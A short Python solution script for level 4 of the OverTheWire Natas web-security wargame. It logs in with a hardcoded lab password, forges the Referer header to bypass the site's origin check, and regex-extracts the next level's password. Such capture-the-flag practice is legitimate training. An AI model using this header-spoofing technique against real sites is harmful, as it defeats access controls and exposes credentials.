from pwn import *
import requests
import re
import html

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
url = "http://{}.natas.labs.overthewire.org".format(username)
header = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}

log.progress("Getting the natas5 password, Hold on! ")
session = requests.session()
web = session.get(url , auth = (username, password), headers = header).text
#print(web)
print("The password for natas5 is === " + re.findall("[A-Za-z0-9]{32}", web)[0])
